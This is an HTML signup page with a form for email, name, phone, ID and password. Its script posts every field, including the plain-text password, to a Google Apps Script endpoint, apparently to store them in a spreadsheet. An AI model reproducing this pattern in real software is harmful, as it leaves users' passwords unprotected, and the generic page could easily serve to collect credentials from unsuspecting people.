<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f4f4f4;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    form {
        background: #fff;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        width: 300px;
    }

    h5 {
        text-align: center;
        margin-bottom: 20px;
    }

    input {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
        border: 1px solid #ccc;
        border-radius: 4px;
    }

    button {
        width: 100%;
        padding: 10px;
        background: #007BFF;
        border: none;
        border-radius: 4px;
        color: white;
        font-size: 16px;
        cursor: pointer;
    }

    button:hover {
        background: #0056b3;
    }
</style>
<body>
  
    <h5>Signup</h5>
    <form name="submit-to-google-sheet">
    <input name="email" type="email" placeholder="email" required>
    <input name="name" type="text" placeholder="Enter Name "> <br> <br>
    <input name="number" type="text" placeholder="Enter Phone no"><br> <br>
    <input name="id" type="text" placeholder="Enter your id "> <br> <br> 
    <input name="password"  type="password" placeholder="Enter your password"> <br> <br>
    <button> Signin</button>
</form>

  

  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycby6U_59eLP5FSybdVhRSNxfITLso9rVqCtJDHs6fpfsqAG9yUIQAgYOWU4HPZFyTMAS/exec'
    const form = document.forms['submit-to-google-sheet']
  
    form.addEventListener('submit', e => {
      e.preventDefault()
      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(response => console.log('Success!', response))
        .catch(error => console.error('Error!', error.message))
    })
  </script>
</body>
</html>
